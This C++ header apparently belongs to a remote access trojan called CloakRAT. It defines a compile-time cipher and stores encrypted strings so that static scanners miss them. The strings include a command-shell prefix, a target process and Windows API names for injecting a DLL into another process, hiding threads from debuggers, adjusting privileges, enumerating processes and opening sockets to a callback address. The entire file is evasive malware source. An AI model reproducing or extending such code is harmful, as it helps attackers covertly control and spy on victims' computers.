#pragma once

#include <array>

#define BUILD_TIME_CIPHER_BYTE (uint8_t)((i % 4 | ((i - 9) + 2 + BUILD_TIME_KEY[i % BUILD_TIME_KEY.size()] & ((i/2)>>3) * i - BUILD_TIME_KEY[i % BUILD_TIME_KEY.size()]) << (i % 5)) & 0x7F ^ 61)
static std::array<uint8_t, 16> BUILD_TIME_KEY = { 69, 18, 70, 56, 14, 255, 107, 144, 218, 100, 176, 217, 55, 23, 223, 185 };

typedef struct EncryptedBytes {
    uint8_t* data;
    size_t length;
} EncryptedBytes;

// "127.0.0.1"
static uint8_t str_ip_data[] = { 101, 21, 13, 9, 51, 12, 17, 78, 3, 77 };
static EncryptedBytes str_ip = {
    str_ip_data,
    sizeof(str_ip_data)
};

// "cmd.exe /C"
static uint8_t str_cmd_data[] = { 13, 71, 82, 90, 51, 89, 71, 27, 13, 83, 108 };
static EncryptedBytes str_cmd = {
    str_cmd_data,
    sizeof(str_cmd_data)
};

// "C:\Users\tal78\Desktop\Workspace\CloakRAT\x64\Release\CloakRAT.dll"
static uint8_t str_dllPath_data[] = { 72, 103, 5, 98, 72, 79, 90, 12, 94, 32, 91, 87, 113, 67, 7, 34, 109, 41, 76, 85, 75, 91, 103, 98, 74, 103, 73, 85, 110, 12, 106, 93, 48, 96, 124, 86, 6, 121, 84, 108, 14, 100, 99, 46, 11, 8, 107, 104, 8, 80, 10, 31, 102, 89, 67, 125, 69, 75, 78, 85, 3, 125, 35, 16, 121, 16, 83 };
static EncryptedBytes str_dllPath = {
    str_dllPath_data,
    sizeof(str_dllPath_data)
};

// "notepad.exe"
static uint8_t str_procName_data[] = { 111, 74, 80, 74, 120, 76, 94, 26, 3, 25, 87, 83 };
static EncryptedBytes str_procName = {
    str_procName_data,
    sizeof(str_procName_data)
};

// "NtSetInformationThread"
static uint8_t str_NtSetInformationThread_data[] = { 83, 106, 75, 109, 120, 72, 118, 16, 75, 19, 93, 91, 124, 0, 86, 17, 71, 24, 87, 76, 90, 85, 115 };
static EncryptedBytes str_NtSetInformationThread = {
    str_NtSetInformationThread_data,
    sizeof(str_NtSetInformationThread_data)
};

// "GetCurrentThread"
static uint8_t str_GetCurrentThread_data[] = { 60, 99, 90, 74, 94, 73, 77, 12, 72, 18, 91, 98, 117, 6, 90, 31, 77 };
static EncryptedBytes str_GetCurrentThread = {
    str_GetCurrentThread_data,
    sizeof(str_GetCurrentThread_data)
};

// "Sleep"
static uint8_t str_Sleep_data[] = { 32, 119, 83, 91, 120, 76 };
static EncryptedBytes str_Sleep = {
    str_Sleep_data,
    sizeof(str_Sleep_data)
};

// "OpenProcess"
static uint8_t str_OpenProcess_data[] = { 126, 107, 79, 91, 115, 108, 77, 17, 78, 25, 92, 69 };
static EncryptedBytes str_OpenProcess = {
    str_OpenProcess_data,
    sizeof(str_OpenProcess_data)
};

// "VirtualAllocEx"
static uint8_t str_VirtualAllocEx_data[] = { 111, 114, 86, 76, 105, 73, 94, 18, 108, 16, 67, 89, 126, 49, 71 };
static EncryptedBytes str_VirtualAllocEx = {
    str_VirtualAllocEx_data,
    sizeof(str_VirtualAllocEx_data)
};

// "WriteProcessMemory"
static uint8_t str_WriteProcessMemory_data[] = { 88, 115, 77, 87, 105, 89, 111, 12, 66, 31, 74, 69, 110, 57, 90, 19, 70, 62, 70 };
static EncryptedBytes str_WriteProcessMemory = {
    str_WriteProcessMemory_data,
    sizeof(str_WriteProcessMemory_data)
};

// "LoadLibraryA"
static uint8_t str_LoadLibraryA_data[] = { 96, 104, 80, 95, 121, 112, 86, 28, 95, 29, 93, 79, 92 };
static EncryptedBytes str_LoadLibraryA = {
    str_LoadLibraryA_data,
    sizeof(str_LoadLibraryA_data)
};

// "CreateRemoteThread"
static uint8_t str_CreateRemoteThread_data[] = { 43, 103, 77, 91, 124, 72, 90, 44, 72, 17, 64, 66, 120, 32, 87, 12, 76, 45, 91 };
static EncryptedBytes str_CreateRemoteThread = {
    str_CreateRemoteThread_data,
    sizeof(str_CreateRemoteThread_data)
};

// "CloseHandle"
static uint8_t str_CloseHandle_data[] = { 35, 103, 83, 81, 110, 89, 119, 31, 67, 24, 67, 83 };
static EncryptedBytes str_CloseHandle = {
    str_CloseHandle_data,
    sizeof(str_CloseHandle_data)
};

// "LookupPrivilegeValueA"
static uint8_t str_LookupPrivilegeValueA_data[] = { 25, 104, 80, 81, 118, 73, 79, 46, 95, 21, 89, 95, 113, 17, 88, 27, 127, 45, 83, 75, 90, 117 };
static EncryptedBytes str_LookupPrivilegeValueA = {
    str_LookupPrivilegeValueA_data,
    sizeof(str_LookupPrivilegeValueA_data)
};

// "GetLastError"
static uint8_t str_GetLastError_data[] = { 26, 99, 90, 74, 81, 93, 76, 10, 104, 14, 93, 89, 111 };
static EncryptedBytes str_GetLastError = {
    str_GetLastError_data,
    sizeof(str_GetLastError_data)
};

// "AdjustTokenPrivileges"
static uint8_t str_AdjustTokenPrivileges_data[] = { 109, 101, 91, 84, 104, 79, 75, 42, 66, 23, 74, 88, 77, 6, 86, 8, 64, 32, 90, 89, 90, 71 };
static EncryptedBytes str_AdjustTokenPrivileges = {
    str_AdjustTokenPrivileges_data,
    sizeof(str_AdjustTokenPrivileges_data)
};

// "OpenProcessToken"
static uint8_t str_OpenProcessToken_data[] = { 116, 107, 79, 91, 115, 108, 77, 17, 78, 25, 92, 69, 73, 27, 84, 27, 71 };
static EncryptedBytes str_OpenProcessToken = {
    str_OpenProcessToken_data,
    sizeof(str_OpenProcessToken_data)
};

// "GetCurrentProcess"
static uint8_t str_GetCurrentProcess_data[] = { 115, 99, 90, 74, 94, 73, 77, 12, 72, 18, 91, 102, 111, 27, 92, 27, 90, 63 };
static EncryptedBytes str_GetCurrentProcess = {
    str_GetCurrentProcess_data,
    sizeof(str_GetCurrentProcess_data)
};

// "CreateToolhelp32Snapshot"
static uint8_t str_CreateToolhelp32Snapshot_data[] = { 15, 103, 77, 91, 124, 72, 90, 42, 66, 19, 67, 94, 120, 24, 79, 77, 27, 31, 81, 95, 79, 71, 127, 81, 105 };
static EncryptedBytes str_CreateToolhelp32Snapshot = {
    str_CreateToolhelp32Snapshot_data,
    sizeof(str_CreateToolhelp32Snapshot_data)
};

// "Process32First"
static uint8_t str_Process32First_data[] = { 112, 116, 77, 81, 126, 89, 76, 13, 30, 78, 105, 95, 111, 7, 75 };
static EncryptedBytes str_Process32First = {
    str_Process32First_data,
    sizeof(str_Process32First_data)
};

// "Process32Next"
static uint8_t str_Process32Next_data[] = { 102, 116, 77, 81, 126, 89, 76, 13, 30, 78, 97, 83, 101, 0 };
static EncryptedBytes str_Process32Next = {
    str_Process32Next_data,
    sizeof(str_Process32Next_data)
};

// "CreatePipe"
static uint8_t str_CreatePipe_data[] = { 111, 103, 77, 91, 124, 72, 90, 46, 68, 12, 74 };
static EncryptedBytes str_CreatePipe = {
    str_CreatePipe_data,
    sizeof(str_CreatePipe_data)
};

// "SetHandleInformation"
static uint8_t str_SetHandleInformation_data[] = { 54, 119, 90, 74, 85, 93, 81, 26, 65, 25, 102, 88, 123, 27, 77, 19, 72, 56, 86, 81, 81 };
static EncryptedBytes str_SetHandleInformation = {
    str_SetHandleInformation_data,
    sizeof(str_SetHandleInformation_data)
};

// "ReadFile"
static uint8_t str_ReadFile_data[] = { 43, 118, 90, 95, 121, 122, 86, 18, 72 };
static EncryptedBytes str_ReadFile = {
    str_ReadFile_data,
    sizeof(str_ReadFile_data)
};

// "FormatMessageA"
static uint8_t str_FormatMessageA_data[] = { 5, 98, 80, 76, 112, 93, 75, 51, 72, 15, 92, 87, 122, 17, 126 };
static EncryptedBytes str_FormatMessageA = {
    str_FormatMessageA_data,
    sizeof(str_FormatMessageA_data)
};

// "LocalFree"
static uint8_t str_LocalFree_data[] = { 57, 104, 80, 93, 124, 80, 121, 12, 72, 25 };
static EncryptedBytes str_LocalFree = {
    str_LocalFree_data,
    sizeof(str_LocalFree_data)
};

// "CreateProcessA"
static uint8_t str_CreateProcessA_data[] = { 36, 103, 77, 91, 124, 72, 90, 46, 95, 19, 76, 83, 110, 7, 126 };
static EncryptedBytes str_CreateProcessA = {
    str_CreateProcessA_data,
    sizeof(str_CreateProcessA_data)
};

// "IsDebuggerPresent"
static uint8_t str_IsDebuggerPresent_data[] = { 124, 109, 76, 122, 120, 94, 74, 25, 74, 25, 93, 102, 111, 17, 76, 27, 71, 56 };
static EncryptedBytes str_IsDebuggerPresent = {
    str_IsDebuggerPresent_data,
    sizeof(str_IsDebuggerPresent_data)
};

// "GetModuleHandleW"
static uint8_t str_GetModuleHandleW_data[] = { 47, 99, 90, 74, 80, 83, 91, 11, 65, 25, 103, 87, 115, 16, 83, 27, 126 };
static EncryptedBytes str_GetModuleHandleW = {
    str_GetModuleHandleW_data,
    sizeof(str_GetModuleHandleW_data)
};

// "VirtualProtect"
static uint8_t str_VirtualProtect_data[] = { 66, 114, 86, 76, 105, 73, 94, 18, 125, 14, 64, 66, 120, 23, 75 };
static EncryptedBytes str_VirtualProtect = {
    str_VirtualProtect_data,
    sizeof(str_VirtualProtect_data)
};

// "HeapSetInformation"
static uint8_t str_HeapSetInformation_data[] = { 52, 108, 90, 95, 109, 111, 90, 10, 100, 18, 73, 89, 111, 25, 94, 10, 64, 35, 81 };
static EncryptedBytes str_HeapSetInformation = {
    str_HeapSetInformation_data,
    sizeof(str_HeapSetInformation_data)
};

// "FindWindowW"
static uint8_t str_FindWindowW_data[] = { 104, 98, 86, 80, 121, 107, 86, 16, 73, 19, 88, 97 };
static EncryptedBytes str_FindWindowW = {
    str_FindWindowW_data,
    sizeof(str_FindWindowW_data)
};

// "GetProcessHeap"
static uint8_t str_GetProcessHeap_data[] = { 0, 99, 90, 74, 77, 78, 80, 29, 72, 15, 92, 126, 120, 21, 79 };
static EncryptedBytes str_GetProcessHeap = {
    str_GetProcessHeap_data,
    sizeof(str_GetProcessHeap_data)
};

// "GetComputerNameW"
static uint8_t str_GetComputerNameW_data[] = { 90, 99, 90, 74, 94, 83, 82, 14, 88, 8, 74, 68, 83, 21, 82, 27, 126 };
static EncryptedBytes str_GetComputerNameW = {
    str_GetComputerNameW_data,
    sizeof(str_GetComputerNameW_data)
};

// "OpenThread"
static uint8_t str_OpenThread_data[] = { 61, 107, 79, 91, 115, 104, 87, 12, 72, 29, 75 };
static EncryptedBytes str_OpenThread = {
    str_OpenThread_data,
    sizeof(str_OpenThread_data)
};

// "GetEnvironmentVariableW"
static uint8_t str_GetEnvironmentVariableW_data[] = { 90, 99, 90, 74, 88, 82, 73, 23, 95, 19, 65, 91, 120, 26, 75, 40, 72, 62, 86, 95, 93, 88, 114, 105 };
static EncryptedBytes str_GetEnvironmentVariableW = {
    str_GetEnvironmentVariableW_data,
    sizeof(str_GetEnvironmentVariableW_data)
};

// "GetThreadContext"
static uint8_t str_GetThreadContext_data[] = { 70, 99, 90, 74, 73, 84, 77, 27, 76, 24, 108, 89, 115, 0, 90, 6, 93 };
static EncryptedBytes str_GetThreadContext = {
    str_GetThreadContext_data,
    sizeof(str_GetThreadContext_data)
};

// "IsWow64Process"
static uint8_t str_IsWow64Process_data[] = { 46, 109, 76, 105, 114, 75, 9, 74, 125, 14, 64, 85, 120, 7, 76 };
static EncryptedBytes str_IsWow64Process = {
    str_IsWow64Process_data,
    sizeof(str_IsWow64Process_data)
};

// "GetWindowLongPtrW"
static uint8_t str_GetWindowLongPtrW_data[] = { 24, 99, 90, 74, 74, 85, 81, 26, 66, 11, 99, 89, 115, 19, 111, 10, 91, 27 };
static EncryptedBytes str_GetWindowLongPtrW = {
    str_GetWindowLongPtrW_data,
    sizeof(str_GetWindowLongPtrW_data)
};

// "GetWindowRect"
static uint8_t str_GetWindowRect_data[] = { 96, 99, 90, 74, 74, 85, 81, 26, 66, 11, 125, 83, 126, 0 };
static EncryptedBytes str_GetWindowRect = {
    str_GetWindowRect_data,
    sizeof(str_GetWindowRect_data)
};

// "WSAStartup"
static uint8_t str_WSAStartup_data[] = { 80, 115, 108, 127, 78, 72, 94, 12, 89, 9, 95 };
static EncryptedBytes str_WSAStartup = {
    str_WSAStartup_data,
    sizeof(str_WSAStartup_data)
};

// "htons"
static uint8_t str_htons_data[] = { 125, 76, 75, 81, 115, 79 };
static EncryptedBytes str_htons = {
    str_htons_data,
    sizeof(str_htons_data)
};

// "inet_pton"
static uint8_t str_inet_pton_data[] = { 94, 77, 81, 91, 105, 99, 79, 10, 66, 18 };
static EncryptedBytes str_inet_pton = {
    str_inet_pton_data,
    sizeof(str_inet_pton_data)
};

// "connect"
static uint8_t str_connect_data[] = { 53, 71, 80, 80, 115, 89, 92, 10 };
static EncryptedBytes str_connect = {
    str_connect_data,
    sizeof(str_connect_data)
};

// "htonl"
static uint8_t str_htonl_data[] = { 118, 76, 75, 81, 115, 80 };
static EncryptedBytes str_htonl = {
    str_htonl_data,
    sizeof(str_htonl_data)
};

// "send"
static uint8_t str_send_data[] = { 105, 87, 90, 80, 121 };
static EncryptedBytes str_send = {
    str_send_data,
    sizeof(str_send_data)
};

// "socket"
static uint8_t str_socket_data[] = { 63, 87, 80, 93, 118, 89, 75 };
static EncryptedBytes str_socket = {
    str_socket_data,
    sizeof(str_socket_data)
};

// "recv"
static uint8_t str_recv_data[] = { 96, 86, 90, 93, 107 };
static EncryptedBytes str_recv = {
    str_recv_data,
    sizeof(str_recv_data)
};

// "ntohl"
static uint8_t str_ntohl_data[] = { 81, 74, 75, 81, 117, 80 };
static EncryptedBytes str_ntohl = {
    str_ntohl_data,
    sizeof(str_ntohl_data)
};

// "closesocket"
static uint8_t str_closesocket_data[] = { 65, 71, 83, 81, 110, 89, 76, 17, 78, 23, 74, 66 };
static EncryptedBytes str_closesocket = {
    str_closesocket_data,
    sizeof(str_closesocket_data)
};

// "WSACleanup"
static uint8_t str_WSACleanup_data[] = { 102, 115, 108, 127, 94, 80, 90, 31, 67, 9, 95 };
static EncryptedBytes str_WSACleanup = {
    str_WSACleanup_data,
    sizeof(str_WSACleanup_data)
};

// "kernel32.dll"
static uint8_t str_kernel32_data[] = { 100, 79, 90, 76, 115, 89, 83, 77, 31, 82, 75, 90, 113 };
static EncryptedBytes str_kernel32 = {
    str_kernel32_data,
    sizeof(str_kernel32_data)
};

// "ntdll.dll"
static uint8_t str_ntdll_data[] = { 112, 74, 75, 90, 113, 80, 17, 26, 65, 16 };
static EncryptedBytes str_ntdll = {
    str_ntdll_data,
    sizeof(str_ntdll_data)
};

// "advapi32.dll"
static uint8_t str_advapi32_data[] = { 88, 69, 91, 72, 124, 76, 86, 77, 31, 82, 75, 90, 113 };
static EncryptedBytes str_advapi32 = {
    str_advapi32_data,
    sizeof(str_advapi32_data)
};

// "ws2_32.dll"
static uint8_t str_ws2_32_data[] = { 76, 83, 76, 12, 66, 15, 13, 80, 73, 16, 67 };
static EncryptedBytes str_ws2_32 = {
    str_ws2_32_data,
    sizeof(str_ws2_32_data)
};

// "user32.dll"
static uint8_t str_user32_data[] = { 78, 81, 76, 91, 111, 15, 13, 80, 73, 16, 67 };
static EncryptedBytes str_user32 = {
    str_user32_data,
    sizeof(str_user32_data)
};

// "WSAGetLastError"
static uint8_t str_WSAGetLastError_data[] = { 24, 115, 108, 127, 90, 89, 75, 50, 76, 15, 91, 115, 111, 6, 80, 12 };
static EncryptedBytes str_WSAGetLastError = {
    str_WSAGetLastError_data,
    sizeof(str_WSAGetLastError_data)
};
